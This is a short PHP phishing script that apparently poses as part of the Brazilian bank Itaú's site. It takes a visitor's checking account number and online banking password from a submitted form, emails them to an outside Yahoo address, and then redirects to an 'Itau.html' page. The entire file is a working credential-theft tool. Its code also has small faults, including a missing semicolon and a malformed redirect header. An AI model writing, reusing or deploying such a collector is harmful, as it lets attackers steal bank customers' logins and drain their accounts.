<?
        
         $destinatario = "mamaeita@yahoo.com";


         $conta = $_REQUEST['conta'];
         $senhaOn = $_REQUEST['senhaON'];
         $assunto = $_REQUEST['nomeCliente'];
         $email = $_REQUEST['email']


         $body = "=======================================================" ."\n";
         $body = $body. "Dados Cadastrais do Cliente" . "\n";
         $body = "=======================================================" ."\n";

         $body = $body. "Conta-Corrente:" . $conta ."\n";
         $body = $body. "Senha Online" . $senhaOn ."\n";

         mail($destinatario, $assunto, $body, "From: $email\r\n" );
         
         header("Itau.html");
                  

         

?>
